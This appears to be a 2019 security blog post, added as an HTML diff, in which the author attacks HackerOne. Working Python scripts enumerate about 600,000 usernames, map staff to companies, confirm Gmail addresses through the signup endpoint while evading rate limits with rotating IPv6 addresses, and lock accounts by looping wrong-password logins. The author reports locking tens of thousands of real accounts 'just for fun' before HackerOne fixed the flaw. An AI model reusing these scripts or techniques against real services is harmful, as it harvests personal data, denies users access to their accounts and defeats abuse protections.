@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link rel="shortcut icon" href="../../../public/1616.ico">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Enum H1 Staff and Users email addresses and Lock accounts - Posted By Tr3jer</title>
+    <meta name="description" content="Hacking for fun. - Tr3jer_CongRong"/>
+    <link rel="stylesheet" href="/css/Tr3jer.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <div class="site">
+      <div class="post-content">
+        <div id="post">
+          <h1 id="enum-h1-staff-and-users-email-addresses-and-lock-accounts">Enum H1 Staff and Users email addresses and Lock accounts</h1>
+<p class="date">14 Dec 2019 - Tr3jer_CongRong</p>
+
+<p>I found https://hackerone.com/sitemap.json a few months ago, but saw that only users starting withawere returned, but later I found out that it can be accessed via the parameter <code>first</code> Enumerate all users:</p>
+
+<pre><code>https://hackerone.com/sitemap.json?first=[a-z]
+</code></pre>
+
+<p>After I got the id of nearly 600,000 users, thinking about how to use this data to maximize the harm?</p>
+
+<p>So I thought of three ideas:</p>
+
+<ol>
+  <li>By requesting the <code>graphql</code> interface, query the team that each user belongs to. Reverse this result into: List of companies-&gt; Staff. (Unrestricted)</li>
+  <li>Merge all common email addresses with ids, and enumerate whether the email addresses exists in the registration interface. (Limited, but can be bypassed with more IPv6)</li>
+  <li>Finally, you can use the blasted email addresses to log-in to the interface and request more than 100+ wrong passwords to lock your account. XD</li>
+</ol>
+
+<h2 id="0x01-company---staff">0x01 Company -&gt; Staff:</h2>
+
+<pre><code>#!/usr/bin/env python
+#coding:utf-8
+
+import os
+import time
+import json
+import string
+import requests
+
+def main(name):
+    print name
+    datas = {"operationName":"getTeams","variables":{"username":"{}".format(name)},"query":"query getTeams($username: String!) {\n  user(username: $username) {\n    memberships(first: 10, where: {concealed: {_eq: false}}) {\n      total_count\n      edges {\n        node {\n          id\n          team {\n            id\n            name\n            handle\n            state\n            profile_picture(size: small)\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
+
+    headers={
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
+        "content-type": "application/json",
+        "x-auth-token": "----",
+        "Connection": "close"
+    }
+    try:
+        r = requests.post("https://hackerone.com/graphql",headers=headers , data=json.dumps(datas), timeout=5)
+        ret = json.loads(r.content)['data']['user']['memberships']
+        if isinstance(ret['total_count'],int):
+            f = open("done.txt",'a')
+            f.write(name + '\n')
+            f.close()
+
+            if ret['total_count'] != 0:
+                results = {name:[team['node']['team']['handle'] for team in ret['edges']]}
+                print results
+                with open("results/{}.txt".format(name),'w') as fp:
+                    json.dump(results, fp, indent=4, ensure_ascii=False)
+    except Exception,e:
+        print e
+
+if __name__ == '__main__':
+    done = [i.strip() for i in open("done.txt")]
+    for i in string.lowercase:
+        with open("{}.txt".format(i)) as f:
+            jf = json.load(f)
+            for k in jf['users']:
+                if k['username'] not in done:
+                    ret = main(k['username'])
+</code></pre>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa2.png" alt="" /></p>
+
+<p>After reversing, the staff corresponding to the company is generated:</p>
+
+<pre><code>#coding:utf-8
+
+import os
+import json
+import string
+
+def main():
+	companys = {}
+	staffs = os.listdir('results')
+	for sf in filter(lambda x:x[-4:] == '.txt',staffs):
+		staff = sf[:-4]
+		with open('results/{}'.format(sf)) as f:
+			sTmp = json.load(f)
+			for c in sTmp.values()[0]:
+				if c not in companys.keys():
+					companys[c] = []
+				companys[c].append(staff)
+
+	profiles = {}
+
+	for i in string.lowercase:
+		with open("{}.txt".format(i)) as f:
+			jf = json.load(f)
+			for k in jf['profiles']:
+				profiles[k['handle']] = k['name']
+
+	f = open("staffList.txt",'a')
+	f.write("| Company (347) | Staff (3488) |\n| --- | --- |\n")
+	for k,v in companys.items():
+		inc = profiles[k] if k in profiles.keys() else k
+		users = []
+		for u in v:
+			users.append("[{}](https://hackerone.com/{})".format(u,u))
+		f.write('| [{}](https://hackerone.com/{}) | '.format(inc,k) + '、'.join(users) + ' |\n')
+	f.close()
+
+
+if __name__ == '__main__':
+	main()
+</code></pre>
+
+<p>So I have a list of <code>347</code> teams corresponding to <code>3488</code> staff XD</p>
+
+<p><a href="https://github.com/Symbo1/HackerOne-Staffs" target="_blank">https://github.com/Symbo1/HackerOne-Staffs</a></p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa3.png" alt="" /></p>
+
+<h2 id="0x02-enumeration-email-addresses">0x02 Enumeration email addresses:</h2>
+
+<p>Under normal circumstances, the registered API will be frequency-limited, but can be bypassed by adding a large number of IPv6 enumerations:</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa4.png" alt="" /></p>
+
+<p>Here only use gmail for testing, in fact, you can also add outlook, yahoo, mail.ru …</p>
+
+<pre><code>import json
+import random
+import string
+import requests
+import netifaces
+from gevent import monkey
+from gevent.pool import Pool
+from requests_toolbelt.adapters import source
+
+monkey.patch_all()
+interfaces = 'ens3'
+
+ips = []
+for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
+	if not ipv6['addr'].split(':')[0] == "fe80":
+		ips.append(ipv6['addr'].split('%')[0])
+
+def main(username):
+	print username
+	email = "{}@gmail.com".format(username)
+	datas = {
+		"user[email]": email
+	}
+
+	headers={
+		"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
+		"Accept":"application/json, text/javascript, */*; q=0.01",
+		"X-CSRF-Token":"...",
+		"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+		"X-Requested-With":"XMLHttpRequest",
+		"Cookie": "...",
+		"Connection":"keep-alive"
+	}
+	try:
+
+		s = requests.Session()
+		new_source = source.SourceAddressAdapter(random.choice(ips))
+		s.mount('http://', new_source)
+		s.mount('https://', new_source)
+
+		r = s.post("https://hackerone.com/users",headers=headers , data=datas, timeout=5)
+		ret = json.loads(r.content)["errors"]
+		if ret:
+			f = open("email-done.txt",'a')
+			f.write(username + '\n')
+			f.close()
+			if "email" in ret.keys():
+				print email
+				f = open("emails.txt",'a')
+				f.write(email + '\n')
+				f.close()
+	except Exception,e:
+		print e
+
+if __name__ == '__main__':
+	tasks = []
+	done = [i.strip() for i in open("email-done.txt")]
+	for i in string.lowercase[:1]:
+		with open("{}.txt".format(i)) as f:
+			jf = json.load(f)
+			for k in jf['users']:
+				if k['username'] not in done:
+					tasks.append(k['username'])
+	pool = Pool(20)
+	pool.map(main, tasks)
+</code></pre>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa5.png" alt="" /></p>
+
+<p>After enumerating <code>30k+</code> ID’s I stopped the testing, and <code>2887</code> of them returned with success: (ps. emmmm悄悄的说，后来我获取到了几万)</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa0.png" alt="" /></p>
+
+<p>As such, for total <code>600k</code> ID’s, we may be able to get at least tens thousands of valid email addresses.</p>
+
+<h2 id="0x03-lock-accounts">0x03 Lock accounts:</h2>
+
+<pre><code>import sys
+import random
+import string
+import requests
+import netifaces
+from gevent import monkey
+from gevent.pool import Pool
+from requests_toolbelt.adapters import source
+
+monkey.patch_all()
+interfaces = 'ens3'
+
+ips = []
+for ipv6 in netifaces.ifaddresses(interfaces)[netifaces.AF_INET6]:
+	if not ipv6['addr'].split(':')[0] == "fe80":
+		ips.append(ipv6['addr'].split('%')[0])
+
+def main(email):
+	datas = {
+		"email":email,
+		"password":''.join(random.sample(string.lowercase,10)),
+		"remember_me":"false"
+	}
+
+	headers={
+		"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
+		"Accept":"application/json, text/javascript, */*; q=0.01",
+		"X-CSRF-Token":"...",
+		"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+		"X-Requested-With":"XMLHttpRequest",
+		"Cookie": "...",
+		"Connection":"keep-alive"
+	}
+	try:
+
+		s = requests.Session()
+		new_source = source.SourceAddressAdapter(random.choice(ips))
+		s.mount('http://', new_source)
+		s.mount('https://', new_source)
+
+		r = s.post("https://hackerone.com/sessions",headers=headers , data=datas, timeout=5)
+		print "password: {} {}".format(datas['password'],r.content)
+	except Exception,e:
+		print e
+
+if __name__ == '__main__':
+	tasks = [sys.argv[1]]*110
+	pool = Pool(20)
+	pool.map(main, tasks)
+</code></pre>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa7.png" alt="" /></p>
+
+<p>After 100+ login attempts with incorrect passwords, the account was locked out successfully.</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa6.png" alt="" /></p>
+
+<p>If I want to lock someone’s account, I just need to enumerate the email addresses and then loop the script. Because the session will be invalidated after being locked, and the <code>unlock token</code> is unique each time it is locked.</p>
+
+<h2 id="0x04-end">0x04 End.</h2>
+
+<p>后来的故事就是封了万个号，h1官方进行了修正，并向被锁账号们群发了该事件的邮件：</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/aa10.png" alt="" /></p>
+
+<p>Just For Fun :]</p>
+
+        </div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+      /* * * CONFIGURATION VARIABLES * * */
+      var disqus_shortname = 'tr3jer';
+      
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+      <div id="disqus_thread"></div>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://github.com/tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Github</a> |&nbsp;
+            <a href="http://weibo.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="https://twitter.com/Tr3jer" target="_blank" style="text-decoration: none; margin-right: 5px;">Twitter</a> |&nbsp;
+            <a href="/link" target="_blank" style="text-decoration: none; margin-right: 5px;">Links</a> |&nbsp;
+            <a href="/mail.txt" target="_blank">Gmail</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="https://s23.cnzz.com/z_stat.php?id=1275554055&web_id=1275554055" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
